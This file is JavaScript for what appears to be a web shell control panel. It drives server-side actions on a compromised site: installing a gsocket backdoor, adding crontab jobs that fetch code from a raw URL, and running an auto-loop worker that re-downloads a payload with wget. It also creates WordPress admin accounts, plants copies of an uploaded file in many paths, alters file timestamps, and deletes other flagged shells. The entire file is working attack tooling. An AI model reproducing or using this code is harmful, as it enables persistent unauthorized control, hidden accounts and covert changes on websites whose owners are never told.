function updateClock() {
    const now = new Date();
    const h = String(now.getHours()).padStart(2, '0');
    const m = String(now.getMinutes()).padStart(2, '0');
    const s = String(now.getSeconds()).padStart(2, '0');
    document.getElementById('clock-hours').textContent = h;
    document.getElementById('clock-minutes').textContent = m;
    document.getElementById('clock-seconds').textContent = s;
    const days = ['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];
    const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
    document.getElementById('clock-date').textContent = now.getDate() + ' ' + months[now.getMonth()] + ' ' + now.getFullYear();
    document.getElementById('clock-day').textContent = days[now.getDay()];
}
setInterval(updateClock, 1000);
updateClock();


// ---- DEFEND panels ----
function showModal(id) { document.getElementById(id).style.display = 'flex'; }
function closeModal(id) { document.getElementById(id).style.display = 'none'; }
function hideLoading(id) { const e = document.getElementById(id); if (e) e.style.display = 'none'; }

function openMenuDefend() { showModal('menuDefendModal'); }
function closeMenuDefend() { closeModal('menuDefendModal'); }

function openGsocket() {
    closeMenuDefend();
    showModal('gsocketModal');
}
function openCrontab() {
    closeMenuDefend();
    showModal('crontabModal');
}
function openCrontabInstall() {
    closeModal('crontabModal');
    showModal('crontabInstallModal');
}
function backToCrontab() {
    closeModal('crontabInstallModal');
    hideLoading('crontabInstallLoading');
    showModal('crontabModal');
}
function backToMenuDefend() {
    ['gsocketModal','crontabModal','crontabInstallModal','scanningModal','scanViewModal','menuBackupModal','backupModal','autoLoopModal','cloneModal','wpAdminModal','actionModal'].forEach(function(id){
        const el = document.getElementById(id); if (el) el.style.display = 'none';
    });
    ['gsocketLoading','crontabLoading','crontabInstallLoading','scanLoading','backupLoading','cloneLoading','wpLoading'].forEach(function(id){
        const el = document.getElementById(id); if (el) el.style.display = 'none';
    });
    showModal('menuDefendModal');
}

function postForm(fields) {
    const fd = new FormData();
    for (const k in fields) fd.append(k, fields[k]);
    return fetch(window.location.search || '', { method: 'POST', body: fd }).then(r => r.text());
}
function extractBox(html) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    let out = '';
    doc.querySelectorAll('.result-box').forEach(b => { out += b.textContent; });
    return out;
}
function showOut(boxId, titleId, title, text) {
    document.getElementById(titleId).textContent = title;
    document.getElementById(boxId).value = text;
    document.getElementById(boxId.replace('Box','')).style.display = 'block';
}

function runGsocket(method) {
    document.getElementById('gsocketLoading').style.display = 'block';
    postForm({ install_gsocket: '1', gs_method: method })
        .then(html => {
            hideLoading('gsocketLoading');
            showOut('gsocketOutBox', 'gsocketOutTitle', 'Gsocket Install [' + method + '] Result:', extractBox(html));
        })
        .catch(err => { hideLoading('gsocketLoading'); showOut('gsocketOutBox', 'gsocketOutTitle', 'Error:', String(err)); });
}

function crontabCheck() {
    document.getElementById('crontabLoading').style.display = 'block';
    postForm({ crontab_check: '1' })
        .then(html => {
            hideLoading('crontabLoading');
            showOut('crontabOutBox', 'crontabOutTitle', 'Crontab List Result:', extractBox(html));
        })
        .catch(err => { hideLoading('crontabLoading'); showOut('crontabOutBox', 'crontabOutTitle', 'Error:', String(err)); });
}

function crontabInstall() {
    const raw = document.getElementById('cronRaw').value.trim();
    const path = document.getElementById('cronPath').value.trim();
    if (!raw || !path) { alert('Raw URL & path are required!'); return; }
    document.getElementById('crontabInstallLoading').style.display = 'block';
    postForm({ crontab_install: '1', cron_raw: raw, cron_path: path })
        .then(html => {
            hideLoading('crontabInstallLoading');
            showOut('crontabInstallOutBox', 'crontabInstallOutTitle', 'Crontab Install Result:', extractBox(html));
        })
        .catch(err => { hideLoading('crontabInstallLoading'); showOut('crontabInstallOutBox', 'crontabInstallOutTitle', 'Error:', String(err)); });
}

// ---- SCANNING ----
let scanAll = [], scanFiltered = [], scanFilter = 'ALL';
const SC_SAFE=30, SC_MAL=85, SC_CRIT=100;

function openScanning() {
    closeMenuDefend();
    showModal('scanningModal');
    const p = document.getElementById('scanPath');
    if (p && !p.value) p.value = '/var/www/html';
}
function openAutoLoop() { closeMenuDefend(); showModal('autoLoopModal'); autoLoopStatus(); }
function autoLoopBadge(txt) {
    const b = document.getElementById('alStatusBadge');
    if (!b) return;
    const setupBox = document.getElementById('alSetupBox');
    const activeBox = document.getElementById('alActiveBox');
    if (txt.indexOf('STATUS: NONE') !== -1) {
        b.textContent = 'BELUM SETUP'; b.style.background='rgba(255,165,0,0.18)'; b.style.color='#ffa500'; b.style.border='1px solid rgba(255,165,0,0.5)';
        if (setupBox) setupBox.style.display='block';
        if (activeBox) activeBox.style.display='none';
    } else if (txt.indexOf('STATUS: AKTIF') !== -1) {
        b.textContent = 'AKTIF'; b.style.background='rgba(0,255,136,0.18)'; b.style.color='#00ff88'; b.style.border='1px solid rgba(0,255,136,0.5)';
        if (setupBox) setupBox.style.display='none';
        if (activeBox) activeBox.style.display='block';
    } else {
        b.textContent = 'MATI'; b.style.background='rgba(255,68,68,0.18)'; b.style.color='#ff4444'; b.style.border='1px solid rgba(255,68,68,0.5)';
        if (setupBox) setupBox.style.display='none';
        if (activeBox) activeBox.style.display='block';
    }
}
async function autoLoopStatus() {
    const b = document.getElementById('alStatusBadge');
    if (b) b.textContent = '...';
    try {
        const fd = new FormData();
        fd.append('autoloop_action','status'); fd.append('al_inline','1');
        const r = await fetch(window.location.search||'', {method:'POST', body:fd});
        const t = await r.text();
        autoLoopBadge(t);
        return t;
    } catch(e) { autoLoopBadge('STATUS: NONE'); }
}
async function autoLoopPost(action, extra) {
    document.getElementById('autoLoopLoading').style.display='block';
    const fd = new FormData();
    fd.append('autoloop_action', action); fd.append('al_inline','1');
    if (extra) for (const k in extra) fd.append(k, extra[k]);
    try {
        const r = await fetch(window.location.search||'', {method:'POST', body:fd});
        const t = await r.text();
        document.getElementById('autoLoopOutTitle').textContent = 'Auto Looping Result:';
        document.getElementById('autoLoopOutBox').value = t;
        document.getElementById('autoLoopOut').style.display='block';
        autoLoopStatus();
    } catch(err) {
        document.getElementById('autoLoopOutTitle').textContent = 'Error:';
        document.getElementById('autoLoopOutBox').value = String(err);
        document.getElementById('autoLoopOut').style.display='block';
    } finally {
        document.getElementById('autoLoopLoading').style.display='none';
    }
}
function autoLoopSetup() {
    const src = document.getElementById('alSource').value.trim();
    const path = document.getElementById('alPath').value.trim();
    const target = (document.getElementById('alTarget') ? document.getElementById('alTarget').value.trim() : '');
    const mEl = document.querySelector('input[name="al_method"]:checked');
    const method = mEl ? mEl.value : 'wget';
    if (!src || !path) { alert('Source & path are required!'); return; }
    autoLoopPost('setup', {al_source:src, al_path:path, al_method:method, al_target:target});
}
function autoLoopStop() {
    if (!confirm('Stop the worker and remove the config?')) return;
    autoLoopPost('stop');
}
function autoLoopDelete() {
    if (!confirm('Remove the .autoloop.conf config?')) return;
    autoLoopPost('delete');
}
/* watchdog removed */
function openMenuBackup() {
    showModal('menuBackupModal');
}
function closeMenuBackup() {
    closeModal('menuBackupModal');
}
function openWpAdmin() { showModal('wpAdminModal'); }
function closeWpAdmin() { closeModal('wpAdminModal'); }
async function runWpAdmin() {
    const path = document.getElementById('wpPath').value.trim();
    const user = document.getElementById('wpUser').value.trim();
    const pass = document.getElementById('wpPass').value.trim();
    const email = document.getElementById('wpEmail').value.trim();
    if (!user || !pass) { alert('Username & password are required!'); return; }
    document.getElementById('wpLoading').style.display = 'block';
    document.getElementById('wpOut').style.display = 'none';
    const fd = new FormData();
    fd.append('wpadmin_action', 'create');
    fd.append('wp_path', path);
    fd.append('wp_user', user);
    fd.append('wp_pass', pass);
    fd.append('wp_email', email);
    try {
        const r = await fetch(window.location.search || '', { method: 'POST', body: fd });
        const html = await r.text();
        const doc = new DOMParser().parseFromString(html, 'text/html');
        let out = '';
        doc.querySelectorAll('.result-box').forEach(b => { out += b.textContent; });
        document.getElementById('wpOutTitle').textContent = 'Create WP Admin Result:';
        document.getElementById('wpOutBox').value = out;
        document.getElementById('wpOut').style.display = 'block';
    } catch (err) {
        document.getElementById('wpOutTitle').textContent = 'Error:';
        document.getElementById('wpOutBox').value = String(err);
        document.getElementById('wpOut').style.display = 'block';
    } finally {
        document.getElementById('wpLoading').style.display = 'none';
    }
}
function openClone() { closeMenuBackup(); showModal('cloneModal'); }
async function runClone() {
    const path = document.getElementById('clonePath').value.trim();
    const count = document.getElementById('cloneCount').value.trim() || '1';
    if (!path) { alert('Path is required!'); return; }
    document.getElementById('cloneLoading').style.display = 'block';
    document.getElementById('cloneOut').style.display = 'none';
    const fd = new FormData();
    fd.append('clone_action', 'run');
    fd.append('clone_path', path);
    fd.append('clone_count', count);
    try {
        const r = await fetch(window.location.search || '', { method: 'POST', body: fd });
        const html = await r.text();
        const doc = new DOMParser().parseFromString(html, 'text/html');
        let out = '';
        doc.querySelectorAll('.result-box').forEach(b => { out += b.textContent; });
        document.getElementById('cloneOutTitle').textContent = 'Clone Result:';
        document.getElementById('cloneOutBox').value = out;
        document.getElementById('cloneOut').style.display = 'block';
    } catch (err) {
        document.getElementById('cloneOutTitle').textContent = 'Error:';
        document.getElementById('cloneOutBox').value = String(err);
        document.getElementById('cloneOut').style.display = 'block';
    } finally {
        document.getElementById('cloneLoading').style.display = 'none';
    }
}
function openBackup() {
    closeMenuBackup();
    showModal('backupModal');
}
function backToMenuBackup() {
    closeModal('backupModal');
    showModal('menuBackupModal');
}
async function runBackup() {
    const f = document.getElementById('backupFile');
    const path = document.getElementById('backupPath').value.trim();
    const count = document.getElementById('backupCount').value.trim() || '1';
    if (!f.files || f.files.length === 0) { alert('Please select a file first!'); return; }
    if (!path) { alert('Path is required!'); return; }
    document.getElementById('backupLoading').style.display = 'block';
    document.getElementById('backupOut').style.display = 'none';
    const fd = new FormData();
    fd.append('backup_upload', '1');
    fd.append('backup_path', path);
    fd.append('backup_count', count);
    fd.append('backup_file', f.files[0]);
    try {
        const r = await fetch(window.location.search || '', { method: 'POST', body: fd });
        const html = await r.text();
        const doc = new DOMParser().parseFromString(html, 'text/html');
        let out = '';
        doc.querySelectorAll('.result-box').forEach(b => { out += b.textContent; });
        document.getElementById('backupOutTitle').textContent = 'Backup Result:';
        document.getElementById('backupOutBox').value = out;
        document.getElementById('backupOut').style.display = 'block';
    } catch (err) {
        document.getElementById('backupOutTitle').textContent = 'Error:';
        document.getElementById('backupOutBox').value = String(err);
        document.getElementById('backupOut').style.display = 'block';
    } finally {
        document.getElementById('backupLoading').style.display = 'none';
    }
}
function scanSetStatus(t){ document.getElementById('scanStatus').textContent = t; }
function scanSetProgress(p){ document.getElementById('scanProgressWrap').style.display='block'; document.getElementById('scanProgressFill').style.width = Math.min(100,Math.max(0,p))+'%'; }

async function startScan() {
    const path = document.getElementById('scanPath').value.trim();
    if (!path) { scanSetStatus('Path is empty!'); return; }
    const btn = document.getElementById('scanBtn');
    btn.disabled = true;
    document.getElementById('scanLoading').style.display='block';
    document.getElementById('scanResultsWrap').style.display='none';
    document.getElementById('scanStats').style.display='none';
    scanSetStatus('Scanning: ' + path); scanSetProgress(15);
    try {
        const fd = new FormData();
        fd.append('deff_action','scan'); fd.append('path', path);
        const res = await fetch(window.location.search||'', {method:'POST', body:fd});
        scanSetProgress(70);
        const json = await res.json();
        if (!json.success) throw new Error(json.error);
        scanAll = json.data || []; scanFiltered = scanAll.slice(); scanFilter='ALL';
        scanSetProgress(100);
        scanStats(scanAll);
        scanRender();
        document.getElementById('scanResultsWrap').style.display='block';
        document.getElementById('scanTools').style.display='flex';
        const sa=document.getElementById('scanSelectAll'); if(sa) sa.checked=false;
        scanSetStatus('Scan complete: ' + json.stats.critical + ' critical, ' + json.stats.high + ' high, ' + json.stats.suspicious + ' suspicious, ' + json.stats.safe + ' safe');
    } catch(err) {
        scanSetStatus('Error: ' + err.message);
    } finally {
        btn.disabled = false;
        document.getElementById('scanLoading').style.display='none';
    }
}

function scanStats(rs) {
    const crit = rs.filter(r=>r.confidence==='CRITICAL').length;
    const high = rs.filter(r=>r.final_score>=SC_MAL && r.confidence!=='CRITICAL').length;
    const susp = rs.filter(r=>r.final_score>=SC_SAFE && r.final_score<SC_MAL && r.confidence!=='CRITICAL').length;
    const safe = rs.filter(r=>r.final_score<SC_SAFE && r.confidence!=='CRITICAL').length;
    const noext = rs.filter(r=>r.ext==='(none)').length;
    const cards = [
        ['Total',rs.length,'ALL'],['Critical',crit,'CRITICAL'],['High',high,'HIGH'],
        ['Suspicious',susp,'SUSPICIOUS'],['Safe',safe,'SAFE'],['No Ext',noext,'NOEXT']
    ];
    document.getElementById('scanStats').innerHTML = cards.map(function(c){
        return '<div class="scan-stat-card" onclick="scanSetFilter(\'' + c[2] + '\')" style="cursor:pointer;"><div class="v">' + c[1] + '</div><div class="l">' + c[0] + '</div></div>';
    }).join('');
    document.getElementById('scanStats').style.display='grid';
    document.getElementById('scanStats').style.flex='0 0 auto';
    document.getElementById('scanStats').style.minHeight='64px';
}

function scanSetFilter(f){ scanFilter=f; scanFiltered = scanAll.slice(); scanRender(); }

function scanRender() {
    let rs = scanAll.filter(function(r){
        if (scanFilter==='ALL') return true;
        if (scanFilter==='CRITICAL') return r.confidence==='CRITICAL';
        if (scanFilter==='HIGH') return r.final_score>=SC_MAL && r.confidence!=='CRITICAL';
        if (scanFilter==='SUSPICIOUS') return r.final_score>=SC_SAFE && r.final_score<SC_MAL && r.confidence!=='CRITICAL';
        if (scanFilter==='SAFE') return r.final_score<SC_SAFE && r.confidence!=='CRITICAL';
        if (scanFilter==='NOEXT') return r.ext==='(none)';
        return true;
    });
    rs.sort(function(a,b){ return b.final_score - a.final_score; });
    const tb = document.getElementById('scanBody');
    if (rs.length===0){ tb.innerHTML='<tr><td colspan="9" style="text-align:center;color:#8b949e;padding:20px;">No results</td></tr>'; return; }
    tb.innerHTML = rs.map(function(it){
        let layers=[];
        if(it.layer_scores){ if(it.layer_scores.layer1>0)layers.push('L1'); if(it.layer_scores.layer2>0)layers.push('L2'); if(it.layer_scores.layer3>0)layers.push('L3'); if(it.layer_scores.layer4>0)layers.push('L4'); if(it.layer_scores.critical>0)layers.push('CR'); }
        const p = it.file.replace(/\\/g,'\\\\').replace(/'/g,"\\'");
        return '<tr>'
         + '<td class="checkbox-cell"><input type="checkbox" class="scan-check" data-path="' + esc(it.file) + '"></td>'
         + '<td class="scan-actions"><button onclick="scanView(\'' + p + '\')">View</button><button style="background:#dc3545;color:#fff;" onclick="scanDelete(\'' + p + '\')">Del</button></td>'
         + '<td class="scan-file">' + esc(it.file) + '</td>'
         + '<td>' + esc(it.ext||'php') + '</td>'
         + '<td><strong>' + it.final_score + '</strong></td>'
         + '<td><span class="scan-badge ' + (it.confidence||'low').toLowerCase() + '">' + (it.confidence||'LOW') + '</span></td>'
         + '<td>' + (it.entropy?it.entropy.toFixed(2):'0') + '</td>'
         + '<td>' + fmtBytes(it.filesize) + '</td>'
         + '<td><small>' + layers.join('+') + '</small></td>'
         + '</tr>';
    }).join('');
}

function scanToggleAll() {
    const all = document.getElementById('scanSelectAll').checked;
    document.querySelectorAll('.scan-check').forEach(function(cb){ cb.checked = all; });
}
async function scanDeleteSelected() {
    const sel = document.querySelectorAll('.scan-check:checked');
    if (sel.length === 0) { alert('Select the files to delete!'); return; }
    if (!confirm('Delete ' + sel.length + ' file(s)?\n\nThis cannot be undone!')) return;
    const files = Array.from(sel).map(function(cb){ return cb.dataset.path; });
    const fd=new FormData(); fd.append('deff_action','delete'); fd.append('files', JSON.stringify(files));
    const r=await fetch(window.location.search||'',{method:'POST',body:fd}); const j=await r.json();
    if(j.success){
        alert('Deleted ' + j.deleted + ' of ' + j.total + ' file(s)');
        scanAll = scanAll.filter(function(x){ return !files.includes(x.file); });
        scanStats(scanAll); scanRender();
        const sa=document.getElementById('scanSelectAll'); if(sa) sa.checked=false;
    } else { alert('Error: ' + j.error); }
}
async function scanView(fp) {
    const w = window.open('', '_blank');
    w.document.write('<pre style="background:#0d1117;color:#d4d4d4;padding:16px;white-space:pre-wrap;">Loading...</pre>');
    const fd=new FormData(); fd.append('deff_action','view'); fd.append('filepath',fp);
    const r=await fetch(window.location.search||'',{method:'POST',body:fd}); const j=await r.json();
    if(j.success){ w.document.body.innerHTML='<pre style="background:#0d1117;color:#d4d4d4;padding:16px;white-space:pre-wrap;font-size:12px;">'+esc(j.content)+'</pre>'; w.document.title=fp; }
    else { w.document.body.innerHTML='<p style="color:#f66;">Error: '+esc(j.error)+'</p>'; }
}

async function scanDelete(fp) {
    if(!confirm('Delete file?\n\n'+fp+'\n\nThis cannot be undone!')) return;
    const fd=new FormData(); fd.append('deff_action','delete'); fd.append('files', JSON.stringify([fp]));
    const r=await fetch(window.location.search||'',{method:'POST',body:fd}); const j=await r.json();
    if(j.success){ scanAll=scanAll.filter(function(x){return x.file!==fp;}); scanStats(scanAll); scanRender(); }
    else alert('Error: '+j.error);
}

function esc(t){ const d=document.createElement('div'); d.textContent=t==null?'':t; return d.innerHTML; }
function fmtBytes(b){ if(!b)return '0 B'; const k=1024,s=['B','KB','MB'],i=Math.floor(Math.log(b)/Math.log(k)); return Math.round(b/Math.pow(k,i)*100)/100+' '+s[i]; }

// ---- FILE ACTIONS (view/edit/rename/delete/chmod/touch) ----
function actDisableAll() {
    ['actViewFile','actDeleteFile','actOldName','actRenameFlag','actChmodFile','actTouchFile'].forEach(function(id){
        const el = document.getElementById(id); if (el) el.disabled = true;
    });
    ['actFieldRename','actFieldChmod','actFieldTouch'].forEach(function(id){
        const el = document.getElementById(id); if (el) el.style.display = 'none';
    });
}
function openAction(action, filename, extra) {
    actDisableAll();
    const modal = document.getElementById('actionModal');
    const title = document.getElementById('actionTitle');
    const nameEl = document.getElementById('actionFileName');
    const submit = document.getElementById('actionSubmit');
    if (!modal) return;
    if (nameEl) nameEl.textContent = filename;
    if (action === 'edit') {
        // edit = load file into editor (same as view flow)
        const f = document.createElement('form');
        f.method = 'post'; f.action = window.location.search || '';
        const h = document.createElement('input');
        h.type = 'hidden'; h.name = 'view_file'; h.value = filename;
        f.appendChild(h); document.body.appendChild(f); f.submit();
        return;
    }
    if (action === 'rename') {
        title.textContent = 'RENAME';
        document.getElementById('actOldName').value = filename;
        document.getElementById('actOldName').disabled = false;
        document.getElementById('actRenameFlag').disabled = false;
        document.getElementById('actFieldRename').style.display = 'block';
        document.getElementById('actNewName').value = filename;
        submit.textContent = 'Rename'; submit.style.background = '#4f46e5'; submit.style.borderColor = '#4f46e5';
        setTimeout(function(){ const i = document.getElementById('actNewName'); if (i) { i.focus(); i.select(); } }, 50);
    } else if (action === 'delete') {
        title.textContent = 'DELETE';
        if (!confirm('Delete?\n\n' + filename + '\n\nThis cannot be undone!')) return;
        const f = document.createElement('form');
        f.method = 'post'; f.action = window.location.search || '';
        const h = document.createElement('input');
        h.type = 'hidden'; h.name = 'delete_file'; h.value = filename;
        f.appendChild(h); document.body.appendChild(f); f.submit();
        return;
    } else if (action === 'chmod') {
        title.textContent = 'CHMOD — SET PERMISSION';
        document.getElementById('actChmodFile').value = filename;
        document.getElementById('actChmodFile').disabled = false;
        document.getElementById('actChmodMode').value = (extra || '').replace(/[^0-7]/g, '').slice(-4) || '';
        document.getElementById('actFieldChmod').style.display = 'block';
        submit.textContent = 'Set Perm'; submit.style.background = '#b45309'; submit.style.borderColor = '#b45309';
        setTimeout(function(){ const i = document.getElementById('actChmodMode'); if (i) { i.focus(); i.select(); } }, 50);
    } else if (action === 'touch') {
        title.textContent = 'TOUCH — MODIFIED TIME';
        document.getElementById('actTouchFile').value = filename;
        document.getElementById('actTouchFile').disabled = false;
        document.getElementById('actTouchTime').value = '';
        document.getElementById('actFieldTouch').style.display = 'block';
        submit.textContent = 'Set Time'; submit.style.background = '#0d9488'; submit.style.borderColor = '#0d9488';
        setTimeout(function(){ const i = document.getElementById('actTouchTime'); if (i) i.focus(); }, 50);
    }
    showModal('actionModal');
}

document.addEventListener('DOMContentLoaded', function() {
    const mbtn = document.getElementById('menuDefendBtn');
    if (mbtn) mbtn.addEventListener('click', openMenuDefend);
    const bbtn = document.getElementById('menuBackupBtn');
    if (bbtn) bbtn.addEventListener('click', openMenuBackup);
    const wpbtn = document.getElementById('wpAdminBtn');
    if (wpbtn) wpbtn.addEventListener('click', openWpAdmin);
    ['menuDefendModal','gsocketModal','crontabModal','crontabInstallModal','scanningModal','menuBackupModal','backupModal','autoLoopModal','cloneModal','wpAdminModal','actionModal'].forEach(function(id) {
        const el = document.getElementById(id);
        if (el) el.addEventListener('click', function(e) {
            if (e.target === el) closeModal(id);
        });
    });
});
